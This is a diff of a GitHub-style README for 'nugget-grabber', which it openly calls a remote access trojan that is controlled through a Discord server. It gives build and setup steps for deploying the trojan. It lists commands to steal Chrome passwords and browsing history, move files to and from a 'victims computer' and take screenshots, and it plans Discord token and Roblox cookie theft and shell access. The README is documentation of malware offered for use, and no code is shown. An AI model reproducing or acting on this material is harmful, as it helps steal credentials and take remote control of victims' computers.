@@ -1,45 +1,64 @@
 # nugget-grabber
 
-This script is a Discord bot written in Python using the discord.py library and the requests, socket, os, re, json, base64, sqlite3, win32crypt, Cryptodome, shutil, tempfile, asyncio, and PIL (Pillow) modules. The bot performs various functions, including basic commands such as ping, clearing messages, downloading/uploading files, capturing and sending screenshots, and grabbing stored passwords from Google Chrome.
+Nugget grabber is an advanced RAT (remote access trojan) which uses a discord server as its command and control center. 
 
-# Bot commands
+## Content
 
-;ping
-This command checks the bot's latency and responds with a message containing the latency in milliseconds.
+- [Disclaimer](##DISCLAIMER)
+- [Setup](#Setup)
+- [Commands](##Commands)
+- [TODO](###Upcoming)
+- 
 
-;clear <amt>
-This command allows the bot to delete a specified number of messages (including the command itself) from the channel where the command was issued.
 
-;grab passwords
-This command retrieves and decrypts stored passwords from Google Chrome's local database. The decrypted passwords are then sent as an embedded message to the Discord channel.
+## DISCLAIMER
 
-;download <file_path>
-This command allows users to download a file from the bot's host machine. The bot sends the file as an attachment in the Discord channel.
+THIS IS DANGEROUS SOFTWARE THAT SHOULD NOT BE USED FOR HARM. THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES. USING SOFTWARE LIKE THIS FOR HARM IS ILLEGAL, SO USE WITH CAUTION.
 
-;upload <num_of_files>
-This command prompts the user to upload a specified number of files. The bot waits for the user to upload the files and saves them to its host machine.
 
-;ss (or ;screenshot)
-This command captures a screenshot of the entire screen and sends it as an image file in the Discord channel.
 
 # Setup
-1. Make a discord application using [discord's developer portal](https://discord.com/developers/applications)
-2. Click on `bot` <p align="center">
-  <img width="500" src="assets/aset1.png">
-</p>
-
-3. Make-a-bot!
-4. Enable admin privelages, and enable discord gateway intents.
-5. Congrats! You built a bot! still not done though . . .
-6. Run `pip install -r packs.txt` in the command-line (this installs necessary libraries)
-7. Run `builder.bat`
-8. Go back to your discord bot page3
-9. Click on reset token then copy your token (DO NOT SHARE YOUR TOKEN! A TOKEN IS LIKE A PASSWORD TO YOUR BOT, IF SOMEONE GOT IT, ITS BAD!)
-10. Back to builder and paste your token
-11. Wait til' it builds
-12. Voila!
+1. Create a discord application on [Discord Developer Portal.](https://discord.com/developers/applications)
+2. Navigate to `Bot` in the left sidebar.
+3. Click `Make-a-bot!`.
+4. Scroll down until you see a screen for the bots permissions.
+5. Click `Administrator`
+6. Scroll up and click `Reset Token`
+8. Open up the terminal in the repositorys folder.
+9. Run `pip install -r packs.txt`
+10. Run the `bulder.bat` file. (support for linux *soon*)
+11. Follow the building process.
+12. Once you reach the "Enter you discord bots token: " prompt go back to the developer portal and copy your token and paste it there.
+13. Youre done!
 
 
-# Protecting your token
 
-You might have concerns about the safety of your discord bot token. In other discord RATs the token is easily found by simply reverse engineering the EXE file. In other softwares, the token is stored in plaintext, making it easy to hack into your discord bot. However, nugget-grabber securly encrypts your token with a key encoded in an encoding software (which im not going to say the name of). This way it ensures the safety of your discord bot token.
+## Commands
+.`ping` This command checks the bot's latency and responds with a message containing the latency in milliseconds.
+
+.`clear` This command allows the bot to delete a specified number of messages (including the command itself) from the channel where the command was issued.
+
+`.grab <info>` This command grabs information on victims computer
+
+`.download`download <file_path>` This command allows users to download a file from the bot's host machine. The bot sends the file as an attachment in the Discord channel.
+
+`.upload <num_of_files>` This command prompts the user to upload a specified number of files. The bot waits for the user to upload the files and saves them to its host machine.
+
+`.ss` (or .screenshot) This command captures a screenshot of the entire screen and sends it as an image file in the Discord channel.
+
+## Features
+### Nugget grabber is still under development, but it can still:
+- Steal **CHROME** passwords
+- Steal **CHROME** history
+- Upload files to victims computer
+- Download files from victims computer
+- ping
+- Clear messages.
+
+### --UPCOMING--
+-  [ ] Control multiple PC's
+-  [ ] Global password stealer (steal every browsers saved passwords)
+-  [ ] Discord token stealer
+-  [ ] Roblox cookie stealer
+-  [ ] Shell access
+-  [ ] Make it pretty
